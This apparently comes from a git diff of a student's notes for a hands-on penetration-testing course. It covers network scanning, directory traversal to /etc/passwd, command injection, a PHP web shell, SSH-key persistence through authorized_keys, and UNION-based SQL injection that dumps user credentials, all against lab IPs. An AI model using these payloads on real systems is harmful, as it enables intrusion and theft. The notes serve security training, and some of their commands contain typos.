@@ -55,6 +55,7 @@ Recon/Scanning
 
               nmap -Pn -T5 192.168.65.20 -p-
 3. Host Interrogration (Service)
+/usr/share/nmap/scripts
               nmap -T5 -sV 192.168.665.20 -p (ports grabbed from above)
               nmap -Pn -T5 --script=banner.nse 192.168.65.20 -p 21-23,80 <<<< banner grabs the services
               nmap -Pn -T5 --script=discovery 192.168.65.20 -p 21-23,80 << runs EVERY discovery script
@@ -64,3 +65,434 @@ Recon/Scanning
               
 #CREDENTIAL REUSE 
     using the same creds over and over again
+    
+    
+    ----------------------------------------------------------------------------
+    ============================================================================
+    
+    Day 2:
+    
+    Web Exploitation
+    
+    using tcpdump/wireshark/dev console, view http traffic
+    
+    REQUEST MESSAGE:
+    GET / HTTP/1.1
+    GET = Requestion/Retrieving
+    POST = Sending information
+   (GET<===, POST <===, PUT, HEAD)
+   
+   / = Top level domain
+   www.google.com/
+   www.google.com/maps
+   /maps
+   
+   GET /maps
+   
+  HTTP/1.1 = HTTP Version
+  
+   RESPONSE MESSAGE:
+   HTTP/1.1 200 OK
+   HTTP/1.1 = Version
+   200 = 2|00 
+   2= Successful Messages
+   00 = OK
+   
+   404 = 4|04
+   4 = Client Error
+   04 = Not Found
+   
+   Console tab:
+   function Stuff() {
+   code 
+ 
+  network tab:
+    response headers >> shows lots of useful info
+  
+  HTML = Face of the webpage/jouse
+  CSS = Drywall/Paint/Templates
+  Javascript = /Functions/Interactions
+  
+  
+  <script>
+  function ColinFunction() {
+  document.getElementById("demo".innterHTML = "Paragraph changed.";} </script>
+  
+  <script></script = Javascript
+  function ColinFunction() = Defining function, name of the function is whatever
+  document = specifies the HTML document
+  getElementById("demo")
+  
+  ------------------------------------------------------------------------------------------
+  
+  #Java Demo
+  http://10.50.41.203/java/Javademo.html
+ 
+ <!DOCTYPE html>
+<html>
+<head>
+<script>
+function changeText() {   ##the name of the function
+  x  = document.getElementById("mySelect"); 
+  x.options[x.selectedIndex].text = "Melon"; ## Selected Item
+}
+</script>
+</head>
+<body>
+
+<form>
+Select your favorite fruit:
+<select id="mySelect">
+  <option>Apple</option>
+  <option>Orange</option>
+  <option>Pineapple</option>
+  <option>Banana</option>
+</select>
+<br><br>
+<input type="button" onclick="changeText()" value="Set text of selected option"> 
+</form>
+
+</body>
+</html>
+
+
+1. WEB Discovery (Ping Sweep)
+
+              for i in {1..254}; do ping -c 1 -W 1 10.1.1.$1 | grep 'from'; done
+
+2. Web Enumeration (Port Scanning)
+
+              nmap -Pn -T5 192.168.65.20 -p-
+3. Web Interrogration (Service)
+               nmap -Pn -T5 --script=http-robots.txt.nse 192.168.65.20 -p 80
+                      looks at the robots.txt and finds directories based on that
+               nmap -Pn -T5 --script=http-enum.nse 192.168.65.20 -p 80
+                      lists interesting directories
+               GO TO THE DIRECTORIES OFF WHAT'S FOUND
+
+   WEB EXPLOITATION
+   ------------------------------------------ 1. Directory Traversal - Info
+    http://10.50.41.203/path/pathdemo.php
+      INSERT THIS INTO THE SEARCH BAR 
+       ../../../../../../../../../../../../../../etc/passwd
+                                                /etc/group
+                                                /etc/hosts
+                                                /etc/networks
+                                                /etc/resolv.conf
+       #This takes you all the way to root and then 
+       cd <= Linux takes you to ~
+       cd .. <= Windows takes you up 1 level 
+       Network Tab > Headers Tab> Query String Parameters
+       myfile <=== Parameter
+       
+       submit <== Parameter
+       
+       WITHOUT A SEARCH BAR:::::
+           http://10.50.41.203/path/pathdemo.php? (? = Query String Parameters)
+           http://10.50.41.203/path/pathdemo.php?myfile=../../../../../../../../../../../../../../../etc/passwd
+           
+------------------------------------------------    2. Command Injection - Info/Access
+        ATTEMPT DIRECTORY TRAVERSAL: IT DIDN'T WORK
+              In a search bar: attemp to insert a semicolon followed by a command
+              ex: ; cmd
+                  ; pwd
+                  ; id
+    ------------------------------------------------3. Web Shell - Info/Access
+           Conditions:
+           1. Can you upload? Yes
+           2. Is your upload being sanitized? No
+           3. Can you acces the uploads directory? Yes
+          
+          make a shellscript.php
+                      <HTML><BODY>
+            <Form METHOD="GET" NAME="badform" ACTION="">
+            <INPUT TYPE="text" NAME="cmd">
+            <INPUT TYPE="submit" VALUE="hello">
+            </Form>
+            <?php system($_GET['cmd']);?>
+            </BODY></HTML>
+          upload it to the server and go to the uploads folder
+          
+          WITHOUT BEING ABLE TO UPLOAD
+                 SSH Keys - Access
+        
+                    1. Determine who the user is
+                    id
+                    who
+
+                    2. Determine user's home directory
+                    cat /etc/passwd (
+                    find the user's line in etc/passwd
+                      it has the user's home directory and the login shell
+                      
+                    3. generate ssh keys from the workstation from the workstation you will login from
+                          linops:~$ ssh-keygen -t rsa -b 4096 (enter, Y, enter, enter)
+                                    
+                                    cd /home/student/.ssh/
+                                      ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCks3Gs+d4sduIXxi0ANQgzoCXw7QbGu6pr6MzeU6q9ggafJI/jrHVgK8n/hm1KmvOm9vmv/5mHZykfVrV2fOuvtsoeIbuNET/bpQqxay38DEWAk+uZOnp4uxI6GhxboYRz9yksFnJhpghBb6y4X9z90OsZQuM8v4Y8dp/EKmJww3XIQUxGgG4Pci+HLyD6HaOGXP+PzghZDjeeEsR61srkV1hRhh+eiWLoHmjkaxXBwSINsVlG1LSnFUZPt00cQdd6zR26zFzsnnxxFNmKxEgeeZi64UJZj9oYeQdyoIrJ8UC6uGlKZK6z6+VbjtKYrk00JK7//fjDl8+B98PzmXzZ+OFVkKmTg9sWSdhYpvO1kiETYMn2gePCPfZfpGnikdq5swC937AHq5V9l+JhcjNarz81qLLJBuHQ+X3adCGuBrqXfZ+Z4hNxdas4XJLdFZF6JMZIjF7Pu1ui09pFRa+vb66Vzjkm8NoqvfAPY7Z+HS9385MWLEH1+soQ6l/y3gONOqx5Tt40gTuwX9k5vudcyg8AVmi0Td0Y47+y1Jye7mGcBLyltwf63svxqM27iZ9EOtvCc28jv6Q4gef5R/WtfFAVzw/Rl6ZO+EWiQzaoAzrSx5tUzrr1rnEIDkBkNTcxbMqwKzViIgzP1KjfF8gRMbWpYpHLhMQEKae066cZRw== student@lin-ops
+                                    ls
+                                    id_rsa = Private key
+                                    id_rsa.pub = Public key <== Key to be uploaded on target machine
+                                    cat id_rsa.pub (COPY THIS SOMEWHERE) #Congrats you just made a public SSH key
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCoEn28opKJpPUoxxI/MFFZwDz85ilp39vOpzhL6f975TzJsHBuS2/m/6qvNQsbFkGfnGfMnD8NCdGjb9zzsnPDVIsmPZa2LW0UeCuwzXU0ulzTnBLtK5DbqDrwL0akXvfKLRVEWP80o0rY+oUM7IUbkO0d61YbDpcwxiv/9PGvjp/akt2KWQwf3oJotr/kX48jF8JcX7CqHITYiAAujjetCKYpY5bIXsD2CCx+1t1lP8V/zbjytP8kTdVWTsRX37SrksfVBGrOpnUAtdsY7J9ET3pwXFY/AqJr3JfjL5zUvZn4EsO+7L6tHDW/jM7z4bNdK2Fw2cwdWnOJosGTsz2ctRnl60czpQ4F6w/I6v1BXd6i1l7uL9DdjWnwa1U5GXazQzBAvrqRg5JiVaCECYHO+/DO45W6et4plH3+cC7ff6nQx2ephJE77D3xK2bX5xHjePsc9X3QP9/150zjRaLR3N9YPTXMV8NyFntW5//mkuwxREqwpcc98nXTWRLcU6DbiKUv93auccBDkpW9Cv7VgK8q3c4nA4bjvfModXvdNxtXl3azGu8i3DXle2wBJwhvK8UrQMQTgNFAQwZBiJBoODqUgIW5pDM1SaXEnfyY62PtPeIy3OzjB7R5KLhfOapMhVArsG7h9Mt7i6DrMmaPIGBvpaJfmDYUsIn7bNPsHw== student@lin-ops
+                   4. On the Target Machine, validate directories
+                   Validate .ssh/ exists in user's home directory
+                   ls -la /var/www
+                   (if it doesn't,  make it)
+                   mkdir /home/billybob/.ssh
+                   
+                   5. Upload SSH key to authorized_keys file
+                   echo "" > /home/user/.ssh/authorized_keys
+                   echo "PASTE THE SSH KEY INTO HERE" > /home/user/.ssh/authorized_keys
+-----------------------------------------------------------------------------------------------------------------
+                   
+                   DAY 3
+                   WEBEX 2: SQL BOOGALOO
+              an sql server consists of different data bases, which have different tables, which have different columns in them
+              
+              Two commands that are useful: SELECT and UNION
+                  select: extracts daya from a database
+                  union: used to combine the result-set of two or more SELECT
+                  
+             when signed into sql server:
+             if root: 
+                      mysql
+             else:
+                      my sql --user=root --pass=password
+                      
+                      
+                      
+                     show databases; #shows all databases in server
+                     default servers are: 
+                          information_schema: databases of databases, provides list of all databases, tables, and columns
+                          mysql: mysql user list << NOT SUPAH IMPORTANT
+                          performance_schema: provides metrics about the server (ie; runtime) <<<<<<< DONT WORRY ABOUT THIS DATABASE
+                     custom servers are the ones not listed above:
+                          ex: session:
+                          
+              show tables from session; #shows all the tables in the 'session' database
+              
+              select * from session.Tires; #shows all info from the column 'Tires' in the table 'Session' 
+              #once you know all the column names, you call only pull those specifically
+              select name,size from session.Tires
+              
+              select * from session.Tires; select * from session.car
+               ##pulls multiple tables in a nested command
+               
+              select * from session.Tires UNION select * from session.car;
+              # WILL RETURN AN ERROR IF THERE ARE DIFFERENT NUMBER OF COLUMNS
+              
+              #the table 'car' has more tables than 'Tires', so this command is run to combine them and make up for it
+              #this adds more colums to the Tires tables
+              select *,1,2 from session.Tires UNION select * from session.car;
+              
+              
+            #this only selects 4 columns from 'cars'
+              select * from session.Tires UNION select carid,name,type,cost FROM session.car;
+              
+           #fills the leftover columns with nulls 
+              select * from session.car UNION select *,null,null from session.Tires
+              
+              ONLY PULL CERTAIN INFORMATION:
+              SELECT * FROM movies where id =6;
+              SELECT * FROM movies where id BETWEEN 1 AND 5;
+              SELECT * FROM movies where Title like "Toy Story%";
+              SELECT DISTINCT Director FROM movies;
+              SELECT * FROM movies ORDER BY Year DESC
+            Limit 4;
+              SELECT * FROM movies ORDER BY Title ASC 
+              LIMIT 5 OFFSET 5;
+              SELECT * FROM north_american_cities where Country = "United States"
+              ORDER BY Latitude DESC;
+              
+              SELECT * FROM north_american_cities where Longitude < "-87.629798"
+              ORDER BY Longitude;
+              
+              
+              SELECT * FROM north_american_cities WHERE Country = "Mexico"
+              Order by Population DESC
+              Limit 2;
+              
+             SELECT * FROM north_american_cities WHERE Country = "United States"
+             Order by Population DESC
+             Limit 2
+             Offset 3
+             
+             SELECT * from movies
+            INNER JOIN boxoffice
+            ON Movies.id = Boxoffice.movie_id
+            where boxoffice.international_sales > boxoffice.domestic_sales;
+            
+          ---------------------------------------------------------------
+          
+          Default Syntax
+          Select <columns> FROM <database>.<table>;
+          
+        SQL INJECTION
+        
+        #Unsanitized versus Sanitized
+        
+        ' = To modify backend code that utilized quotation marks
+        / = Escape
+        ( or ) = to close off backend code that utilized this
+        
+        
+        Gmail:
+        Username: JohnDoe243
+        Password: pass1234
+        
+        $name = JohnDoe234
+        $pass = pass1234
+        
+        SELECT id from users WHERE name = '$name" AND pass = '$pass'
+        
+        Truth Statement
+        <value>' or 1='1
+        
+        SELECT id FROM users WHERE name ='[<value>' or 1='1]' AND pass='[<value>' or 1='1]'
+        
+        # = Commenting out
+        
+        SQL Injection DEMO:::::::::::::::::::::::::::::::::::
+        10.50.21.1
+        
+        F12 Dev Console > Network Tab > Headers Tab
+        
+        1. determine behavior (try and login)
+        schwart
+        schwart
+        
+        2. determine if vulernable to sql injection
+        
+        Truth Statement 
+        <value>' or 1='1
+        <value>' or 1='1;
+        <value>' or 1='1; #
+        
+        schwar' or 1='1
+        
+        3. Retrieved/Dump information using GET Method
+        username: schwart'+or+1='1
+        pwd: schwart'+or+1='1
+        
+        go to F12 dev console > network tab > click on the post > headers tab and request tab
+          this shows the name of the variables used for the username and pwd you just inserted, in this case the variables ARE 'username' and 'passwd'
+        http://10.50.21.1/login.php
+        http://10.50.21.1/login.php? << makes a query string following
+        http://10.50.21.1/login.php?username=schwart'+or+1='1&passwd=schwart'+or+1='1
+        
+        
+      #SQL Injection - POST Method
+        0. Determine normal behavior (interact with web page)
+       
+        1. Determine if the web page is vulnerable via Truth Statement
+        Truth Statement
+        <Value>'or 1='1
+        <Value>'or 1='1;
+        <Value>'or 1='1; #
+        ONE THE SITE, ALL THE POSSIBLE VALUES WITH ALL POSSIBLE TRUTH STATEMENT, FIND WHAT WORKS
+        Dodge' or 1 ='1 
+        Dodge' or 1 ='1;
+        Dodge' or 1 ='1 #    << THESE DONT
+            
+        Honda' or 1 ='1
+        Honda' or 1 ='1; 
+        Honda' or 1 ='1; # << THESE DONT
+        
+        Audi' or 1 ='1 
+        Audi' or 1 ='1; 
+        Audi' or 1 ='1; # << THESE DO
+        
+        Webpage has 4 columns and 5 rows, found when running this command
+        Pad it, we use UNION select 1,2,3,4 to find how many there are, and the order theyre in
+        Audi' Union select 1,2,3,4    ##count up the the smallest number of possible columns << if this doesn't work use the other variations
+        Audi' Union select 1,2,3,4; 
+        Audi' Union select 1,2,3,4; #  ##<< if these don't work, try the numebr of rows instead 
+       
+        Audi' Union select 1,2,3,4,5 
+        Audi' Union select 1,2,3,4,5; 
+        Audi' Union select 1,2,3,4,5; #  ##<< if this works, that means there's 5 columns on the backend
+                                              columns: 5
+                                              order: 1, 3, 4, 5
+                                              hidden: 2
+                                        
+       DEFAULT Golden Statement
+       select table_schema,table_name,column_name 
+       from information_schema.columns
+       
+       information_schema = database, database of information
+       columns = table, table within information_schema
+       
+       table_schema = columns. database names
+       table_name = columns, table names
+       columns_name = columns, column names
+       
+       Audi' UNION select 1,2,3,4,5; #
+       
+       Audi' UNION select 
+       table_schema,table_name,column_name,1,2 
+       from information_schema.columns; #           << needed to add the 1,2 to match the previously found number of columns   
+       ##This will display 1,2,3,4,5, which is table_schema, table_name, column_name, and padding for the other 2
+       
+       Audi' UNION select
+        table_schema,null,table_name,column_name,1 << null goes in the second spot, because it's hidden
+       from information_schema.columns; #
+       
+       Audi' UNION select studentID,null,username,passwd,null FROM session.userinfo; #
+       
+       
+       
+       GET METHOD:
+        view the ip changing for each links
+        Good Year: http://10.50.21.1/uniondemo.php?Selection=1&Submit=Submit
+        Copper: http://10.50.21.1/uniondemo.php?Selection=2&Submit=Submit
+        Bridgestone: http://10.50.21.1/uniondemo.php?Selection=3&Submit=Submit
+        General: http://10.50.21.1/uniondemo.php?Selection=4&Submit=Submit
+        
+        1. Determine if the webpage is vulnerable via Truth Statement 
+              <value> or 1=1
+              <value> or 1-1;
+              <value> or 1-1; #
+              #CHANGE THE VALUE (IN THIS CASE '4') IF EACH ATTEMPT DOESN'T WORK
+              #YES YOU MIGHT HAVE TO TRY THIS 12 TIMES
+              http://10.50.21.1/uniondemo.php?Selection=4 or 1=1
+              http://10.50.21.1/uniondemo.php?Selection=4 or 1=1; 
+              http://10.50.21.1/uniondemo.php?Selection=4 or 1=1; # << THESE WORK, CONGRATS
+              # DO THESE, IF THEY DON'T WORK, COUNT HIGHER LOL
+              http://10.50.21.1/uniondemo.php?Selection=4 UNION select 1,2,3 
+              http://10.50.21.1/uniondemo.php?Selection=4 UNION select 1,2,3; 
+              http://10.50.21.1/uniondemo.php?Selection=4 UNION select 1,2,3; #
+       2.  Determine the number of columns, order, and hidden 
+           Columns: 3
+           Order: 1,3,2
+           Hidden: N/A
+
+
+
+      3. DEFAULT Golden Statement
+       select table_schema,table_name,column_name 
+        from information_schema.columns
+       
+       information_schema = database, database of information
+       columns = table, table within information_schema
+       
+       table_schema = columns. database names
+       table_name = columns, table names
+       columns_name = columns, column names
+       
+       http://10.50.21.1/uniondemo.php?Selection=4 UNION [GOLDEN STATEMENT]; #
+       
+       http://10.50.21.1/uniondemo.php?Selection=2 UNION select name,id,pass from session.user; #
+       
+       #Version and Functions and Filtering
+       @@version
+       http://10.50.21.1/uniondemo.php?Selection=2 UNION select 1,2,3; #
+       http://10.50.21.1/uniondemo.php?Selection=2 UNION select 1,2,@@version; #
+
+      #Functions
+      load_file('/etc/passwd')
+      http://10.50.21.1/uniondemo.php?Selection=2 UNION select 1,2,load_file(/'etc/passwd'); #
+      
+      #Filtering
+      http://10.50.21.1/uniondemo.php?Selection=4 UNION select table_schema,table_name,column_name from information_schema.columns; #
+      http://10.50.21.1/uniondemo.php?Selection=4 UNION select table_schema,table_name,column_name from information_schema.columns WHERE table_schema='session'; #
